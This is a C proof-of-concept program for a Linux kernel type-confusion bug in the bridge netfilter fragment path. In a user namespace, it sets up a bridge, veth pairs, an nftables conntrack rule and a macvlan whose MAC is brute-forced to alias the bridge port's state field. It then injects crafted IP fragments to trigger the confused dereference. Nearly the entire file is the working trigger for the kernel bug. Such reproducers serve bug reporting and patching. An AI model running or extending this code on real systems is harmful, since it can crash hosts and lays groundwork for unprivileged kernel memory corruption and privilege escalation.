// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <time.h>
#include <grp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <net/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_link.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

#ifndef VETH_INFO_PEER
#define VETH_INFO_PEER 1
#endif
#ifndef NLA_F_NESTED
#define NLA_F_NESTED 0x8000
#endif
#ifndef NETLINK_NETFILTER
#define NETLINK_NETFILTER 12
#endif
#ifndef MACVLAN_MODE_PRIVATE
#define MACVLAN_MODE_PRIVATE 1
#endif

#define NFNL_SUBSYS_NFTABLES	10
#define NFNL_MSG_BATCH_BEGIN	16
#define NFNL_MSG_BATCH_END	17

#define NFT_MSG_NEWTABLE	0
#define NFT_MSG_NEWCHAIN	3
#define NFT_MSG_NEWRULE		6

#define NFTA_TABLE_NAME		1

#define NFTA_CHAIN_TABLE	1
#define NFTA_CHAIN_NAME		3
#define NFTA_CHAIN_HOOK		4
#define NFTA_CHAIN_POLICY	5
#define NFTA_CHAIN_TYPE		7

#define NFTA_HOOK_HOOKNUM	1
#define NFTA_HOOK_PRIORITY	2

#define NFTA_RULE_TABLE		1
#define NFTA_RULE_CHAIN		2
#define NFTA_RULE_EXPRESSIONS	4

#define NFTA_LIST_ELEM		1
#define NFTA_EXPR_NAME		1
#define NFTA_EXPR_DATA		2

#define NFTA_CT_DREG		1
#define NFTA_CT_KEY		2

#define NFT_CT_STATE		0
#define NFT_REG_1		1

struct nfgenmsg_ {
	unsigned char	nfgen_family;
	unsigned char	version;
	unsigned short	res_id;
};

static char nbuf[16384];
static int  nlen;
static struct nlmsghdr *cur;
static unsigned seqno = 100;

static void b_reset(void) { nlen = 0; }

static struct nlmsghdr *m_new(int type, int flags)
{
	cur = (struct nlmsghdr *)(nbuf + nlen);
	memset(cur, 0, NLMSG_HDRLEN);
	cur->nlmsg_len   = NLMSG_HDRLEN;
	cur->nlmsg_type  = type;
	cur->nlmsg_flags = flags;
	cur->nlmsg_seq   = seqno++;
	nlen += NLMSG_HDRLEN;
	return cur;
}

static void *m_raw(int l)
{
	void *p = nbuf + nlen;

	memset(p, 0, NLMSG_ALIGN(l));
	nlen += NLMSG_ALIGN(l);
	cur->nlmsg_len += NLMSG_ALIGN(l);
	return p;
}

static void m_attr(int type, const void *d, int l)
{
	struct nlattr *a = (struct nlattr *)(nbuf + nlen);
	int tot = NLA_HDRLEN + l;

	memset(a, 0, NLA_ALIGN(tot));
	a->nla_type = type;
	a->nla_len  = tot;
	if (d)
		memcpy((char *)a + NLA_HDRLEN, d, l);
	nlen += NLA_ALIGN(tot);
	cur->nlmsg_len += NLA_ALIGN(tot);
}

static void m_u8(int t, unsigned char v)   { m_attr(t, &v, 1); }
static void m_u32(int t, unsigned v)       { m_attr(t, &v, 4); }
static void m_str(int t, const char *s)    { m_attr(t, s, strlen(s) + 1); }

static struct nlattr *m_nest(int type, int nested)
{
	struct nlattr *a = (struct nlattr *)(nbuf + nlen);

	a->nla_type = type | (nested ? NLA_F_NESTED : 0);
	a->nla_len  = NLA_HDRLEN;
	nlen += NLA_HDRLEN;
	cur->nlmsg_len += NLA_HDRLEN;
	return a;
}

static void m_nend(struct nlattr *a)
{
	a->nla_len = (nbuf + nlen) - (char *)a;
}

static int nl_open(int proto)
{
	int fd = socket(AF_NETLINK, SOCK_RAW, proto);
	struct sockaddr_nl sa;
	struct timeval tv = { .tv_sec = 2, .tv_usec = 0 };

	if (fd < 0)
		return -1;
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(fd);
		return -1;
	}
	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	return fd;
}

static int nl_do(int fd, const char *what)
{
	struct sockaddr_nl sa;
	char rb[8192];
	int rc = 0, n, drained = 0;

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;

	if (sendto(fd, nbuf, nlen, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		printf("[!] %s: sendto: %s\n", what, strerror(errno));
		return -1;
	}

	while ((n = recv(fd, rb, sizeof(rb), 0)) > 0) {
		struct nlmsghdr *h = (struct nlmsghdr *)rb;

		for (; NLMSG_OK(h, n); h = NLMSG_NEXT(h, n)) {
			drained++;
			if (h->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(h);

				if (e->error && !rc) {
					rc = e->error;
					printf("[!] %s: netlink error %d (%s)\n",
					       what, e->error, strerror(-e->error));
				}
			}
		}
		if (drained)
			break;
	}
	return rc;
}

static int rtfd;

static int link_up(int idx)
{
	struct ifinfomsg *ifi;

	b_reset();
	m_new(RTM_NEWLINK, NLM_F_REQUEST | NLM_F_ACK);
	ifi = m_raw(sizeof(*ifi));
	ifi->ifi_family = AF_UNSPEC;
	ifi->ifi_index  = idx;
	ifi->ifi_flags  = IFF_UP;
	ifi->ifi_change = IFF_UP;
	return nl_do(rtfd, "link up");
}

static int link_master(int idx, int master)
{
	struct ifinfomsg *ifi;

	b_reset();
	m_new(RTM_NEWLINK, NLM_F_REQUEST | NLM_F_ACK);
	ifi = m_raw(sizeof(*ifi));
	ifi->ifi_family = AF_UNSPEC;
	ifi->ifi_index  = idx;
	m_u32(IFLA_MASTER, master);
	return nl_do(rtfd, master ? "set master" : "nomaster");
}

static int add_bridge(const char *name)
{
	struct ifinfomsg *ifi;
	struct nlattr *li, *id;

	b_reset();
	m_new(RTM_NEWLINK, NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK);
	ifi = m_raw(sizeof(*ifi));
	ifi->ifi_family = AF_UNSPEC;
	m_str(IFLA_IFNAME, name);
	li = m_nest(IFLA_LINKINFO, 0);
	m_str(IFLA_INFO_KIND, "bridge");
	id = m_nest(IFLA_INFO_DATA, 0);
	m_u8(IFLA_BR_NF_CALL_IPTABLES, 1);
	m_nend(id);
	m_nend(li);
	if (nl_do(rtfd, "add bridge") < 0)
		return -1;
	return if_nametoindex(name);
}

static int add_veth(const char *a, const char *b)
{
	struct ifinfomsg *ifi;
	struct nlattr *li, *id, *pe;

	b_reset();
	m_new(RTM_NEWLINK, NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK);
	ifi = m_raw(sizeof(*ifi));
	ifi->ifi_family = AF_UNSPEC;
	m_str(IFLA_IFNAME, a);
	li = m_nest(IFLA_LINKINFO, 0);
	m_str(IFLA_INFO_KIND, "veth");
	id = m_nest(IFLA_INFO_DATA, 0);
	pe = m_nest(VETH_INFO_PEER, 0);
	m_raw(sizeof(struct ifinfomsg));
	m_str(IFLA_IFNAME, b);
	m_nend(pe);
	m_nend(id);
	m_nend(li);
	if (nl_do(rtfd, "add veth") < 0)
		return -1;
	return if_nametoindex(a);
}

static int add_macvlan(const char *name, int lower, const unsigned char *mac)
{
	struct ifinfomsg *ifi;
	struct nlattr *li, *id;

	b_reset();
	m_new(RTM_NEWLINK, NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK);
	ifi = m_raw(sizeof(*ifi));
	ifi->ifi_family = AF_UNSPEC;
	m_str(IFLA_IFNAME, name);
	m_u32(IFLA_LINK, lower);
	m_attr(IFLA_ADDRESS, mac, 6);
	li = m_nest(IFLA_LINKINFO, 0);
	m_str(IFLA_INFO_KIND, "macvlan");
	id = m_nest(IFLA_INFO_DATA, 0);
	m_u32(IFLA_MACVLAN_MODE, MACVLAN_MODE_PRIVATE);
	m_nend(id);
	m_nend(li);
	if (nl_do(rtfd, "add macvlan") < 0)
		return -1;
	return if_nametoindex(name);
}

static int nft_enable_defrag(void)
{
	int fd = nl_open(NETLINK_NETFILTER);
	struct nfgenmsg_ *g;
	struct nlattr *hk, *ex, *el, *ed;
	int rc;

	if (fd < 0) {
		printf("[!] NETLINK_NETFILTER socket: %s\n", strerror(errno));
		return -1;
	}

	b_reset();

	m_new(NFNL_MSG_BATCH_BEGIN, NLM_F_REQUEST);
	g = m_raw(sizeof(*g));
	g->nfgen_family = AF_UNSPEC;
	g->version = 0;
	g->res_id = htons(NFNL_SUBSYS_NFTABLES);

	m_new((NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE,
	      NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK);
	g = m_raw(sizeof(*g));
	g->nfgen_family = 2;
	m_str(NFTA_TABLE_NAME, "brnf");

	m_new((NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN,
	      NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK);
	g = m_raw(sizeof(*g));
	g->nfgen_family = 2;
	m_str(NFTA_CHAIN_TABLE, "brnf");
	m_str(NFTA_CHAIN_NAME, "pre");
	hk = m_nest(NFTA_CHAIN_HOOK, 1);
	m_u32(NFTA_HOOK_HOOKNUM, htonl(0));
	m_u32(NFTA_HOOK_PRIORITY, htonl(0));
	m_nend(hk);
	m_str(NFTA_CHAIN_TYPE, "filter");
	m_u32(NFTA_CHAIN_POLICY, htonl(1));

	m_new((NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
	      NLM_F_REQUEST | NLM_F_CREATE | NLM_F_APPEND | NLM_F_ACK);
	g = m_raw(sizeof(*g));
	g->nfgen_family = 2;
	m_str(NFTA_RULE_TABLE, "brnf");
	m_str(NFTA_RULE_CHAIN, "pre");
	ex = m_nest(NFTA_RULE_EXPRESSIONS, 1);
	el = m_nest(NFTA_LIST_ELEM, 1);
	m_str(NFTA_EXPR_NAME, "ct");
	ed = m_nest(NFTA_EXPR_DATA, 1);
	m_u32(NFTA_CT_DREG, htonl(NFT_REG_1));
	m_u32(NFTA_CT_KEY, htonl(NFT_CT_STATE));
	m_nend(ed);
	m_nend(el);
	m_nend(ex);

	m_new(NFNL_MSG_BATCH_END, NLM_F_REQUEST);
	g = m_raw(sizeof(*g));
	g->nfgen_family = AF_UNSPEC;
	g->res_id = htons(NFNL_SUBSYS_NFTABLES);

	rc = nl_do(fd, "nft batch");
	close(fd);
	return rc;
}

#define GOLDEN_RATIO_64 0x61C8864680B583EBULL

static unsigned mv_bucket(const unsigned char *mac)
{
	unsigned long long v = 0;
	int i;

	for (i = 0; i < 6; i++)
		v |= (unsigned long long)mac[i] << (8 * i);
	v <<= 16;
	return (unsigned)((v * GOLDEN_RATIO_64) >> 56);
}

static void mv_mac_for_bucket(unsigned want, unsigned char *out)
{
	unsigned a, b;

	for (a = 0; a < 256; a++) {
		for (b = 0; b < 256; b++) {
			unsigned char m[6] = { 0x02, 0x00, 0x00, 0x00,
					       (unsigned char)a,
					       (unsigned char)b };
			if (mv_bucket(m) == want) {
				memcpy(out, m, 6);
				return;
			}
		}
	}
	out[0] = 0x02; out[1] = 0; out[2] = 0; out[3] = 0; out[4] = 0; out[5] = 1;
}

static unsigned short csum16(const void *p, int len)
{
	const unsigned char *b = p;
	unsigned long sum = 0;
	int i;

	for (i = 0; i + 1 < len; i += 2)
		sum += (b[i] << 8) | b[i + 1];
	if (i < len)
		sum += b[i] << 8;
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return htons((unsigned short)~sum);
}

static const unsigned char DST_MAC[6] = { 0x02, 0xaa, 0xbb, 0xcc, 0xdd, 0xee };
static const unsigned char SRC_MAC[6] = { 0x02, 0x11, 0x22, 0x33, 0x44, 0x55 };

#define FRAME_LEN 60

static int build_frag(unsigned char *f, unsigned frag_off, int mf,
		      const unsigned char *payload, int plen)
{
	unsigned char *ip = f + 14;
	unsigned short off;

	memset(f, 0, FRAME_LEN);
	memcpy(f, DST_MAC, 6);
	memcpy(f + 6, SRC_MAC, 6);
	f[12] = 0x08;
	f[13] = 0x00;

	ip[0] = 0x45;
	ip[1] = 0;
	*(unsigned short *)(ip + 2) = htons(20 + plen);
	*(unsigned short *)(ip + 4) = htons(0x1337);
	off = (unsigned short)(frag_off & 0x1fff) | (mf ? 0x2000 : 0);
	*(unsigned short *)(ip + 6) = htons(off);
	ip[8] = 64;
	ip[9] = 253;
	*(unsigned short *)(ip + 10) = 0;
	*(unsigned int *)(ip + 12) = inet_addr("10.77.0.1");
	*(unsigned int *)(ip + 16) = inet_addr("10.77.0.2");
	*(unsigned short *)(ip + 10) = csum16(ip, 20);

	memcpy(ip + 20, payload, plen);
	return FRAME_LEN;
}

static int pktfd = -1;

static int send_frame(int ifindex, const unsigned char *f, int len)
{
	struct sockaddr_ll sll;

	if (pktfd < 0) {
		pktfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
		if (pktfd < 0) {
			printf("[!] AF_PACKET socket: %s\n", strerror(errno));
			return -1;
		}
	}
	memset(&sll, 0, sizeof(sll));
	sll.sll_family   = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IP);
	sll.sll_ifindex  = ifindex;
	sll.sll_halen    = 0;

	if (sendto(pktfd, f, len, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
		printf("[!] sendto(AF_PACKET): %s\n", strerror(errno));
		return -1;
	}
	return 0;
}

static void wfile(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);

	if (fd < 0)
		return;
	write(fd, val, strlen(val));
	close(fd);
}

static void show(const char *path)
{
	char b[128];
	int fd = open(path, O_RDONLY);
	int n;

	if (fd < 0)
		return;
	n = read(fd, b, sizeof(b) - 1);
	if (n > 0) {
		b[n] = 0;
		printf("    %s = %s", path, b);
	}
	close(fd);
}

static void msleep_(int ms)
{
	struct timespec ts;

	ts.tv_sec = ms / 1000;
	ts.tv_nsec = (long)(ms % 1000) * 1000000L;
	nanosleep(&ts, NULL);
}

int main(void)
{
	int br, a, ap, b, bp, mv;
	unsigned char mac6[6];
	unsigned char frag[FRAME_LEN];
	unsigned char pay[8];
	uid_t ruid = 1000;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("[*] PoC: stale physinif -> type-confused net_bridge_port in "
	       "br_handle_frame_finish()\n");

	if (getuid() == 0) {
		setgroups(0, NULL);
		if (setresgid(ruid, ruid, ruid) == 0 &&
		    setresuid(ruid, ruid, ruid) == 0)
			printf("[+] dropped to uid %d\n", (int)ruid);
		else
			printf("[*] could not drop privileges, continuing as root\n");
	}

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == 0) {
		char m[64];

		wfile("/proc/self/setgroups", "deny");
		snprintf(m, sizeof(m), "0 %d 1", (int)getuid());
		wfile("/proc/self/uid_map", m);
		snprintf(m, sizeof(m), "0 %d 1", (int)getgid());
		wfile("/proc/self/gid_map", m);
		printf("[+] unshare(CLONE_NEWUSER|CLONE_NEWNET) ok, euid now %d\n",
		       (int)geteuid());
	} else {
		printf("[!] unshare userns+netns failed (%s); trying netns only\n",
		       strerror(errno));
		if (unshare(CLONE_NEWNET) < 0) {
			printf("[-] unshare(CLONE_NEWNET) failed: %s\n",
			       strerror(errno));
			return 1;
		}
	}

	rtfd = nl_open(NETLINK_ROUTE);
	if (rtfd < 0) {
		printf("[-] NETLINK_ROUTE socket: %s\n", strerror(errno));
		return 1;
	}

	br = add_bridge("br0");
	if (br <= 0) {
		printf("[-] bridge creation failed\n");
		return 1;
	}
	printf("[+] br0 ifindex %d (nf_call_iptables=1)\n", br);

	wfile("/proc/sys/net/bridge/bridge-nf-call-iptables", "1");

	a  = add_veth("pa", "pah");
	ap = if_nametoindex("pah");
	b  = add_veth("pb", "pbh");
	bp = if_nametoindex("pbh");
	if (a <= 0 || ap <= 0 || b <= 0 || bp <= 0) {
		printf("[-] veth creation failed (%d %d %d %d)\n", a, ap, b, bp);
		return 1;
	}
	printf("[+] pa=%d pah=%d pb=%d pbh=%d\n", a, ap, b, bp);

	if (link_master(a, br) || link_master(b, br)) {
		printf("[-] enslaving failed\n");
		return 1;
	}
	link_up(br);
	link_up(a);
	link_up(ap);
	link_up(b);
	link_up(bp);
	msleep_(300);

	show("/sys/class/net/pa/brport/state");
	show("/sys/class/net/pb/brport/state");

	if (nft_enable_defrag() != 0)
		printf("[!] nftables setup reported an error - defrag may be off\n");
	else
		printf("[+] nftables ip/pre chain with `ct` expr installed "
		       "(ipv4_conntrack_defrag registered)\n");

	memset(pay, 0x41, sizeof(pay));
	build_frag(frag, 0, 1, pay, 8);
	if (send_frame(ap, frag, FRAME_LEN) < 0)
		return 1;
	printf("[+] head fragment injected on pah -> pa (physinif=%d recorded, "
	       "skb parked in the frag queue)\n", a);
	msleep_(300);

	if (link_master(a, 0)) {
		printf("[-] nomaster failed\n");
		return 1;
	}
	printf("[+] pa removed from br0 (rx_handler_data = NULL)\n");

	mv_mac_for_bucket(6, mac6);
	printf("[*] macvlan MAC %02x:%02x:%02x:%02x:%02x:%02x -> vlan_hash bucket %u "
	       "(aliases net_bridge_port.state)\n",
	       mac6[0], mac6[1], mac6[2], mac6[3], mac6[4], mac6[5],
	       mv_bucket(mac6));

	mv = add_macvlan("mv0", a, mac6);
	if (mv <= 0) {
		printf("[-] macvlan creation failed\n");
		return 1;
	}
	link_up(mv);
	msleep_(200);
	printf("[+] mv0 ifindex %d up: pa->rx_handler_data is now a "
	       "struct macvlan_port *\n", mv);

	build_frag(frag, 1, 0, pay, 8);
	printf("[*] injecting tail fragment on pbh -> pb; expect the type-confused "
	       "deref in br_handle_frame_finish()/bridge_parent_rtable()\n");
	if (send_frame(bp, frag, FRAME_LEN) < 0)
		return 1;

	msleep_(1000);
	printf("[*] no crash observed in this round\n");
	return 0;
}
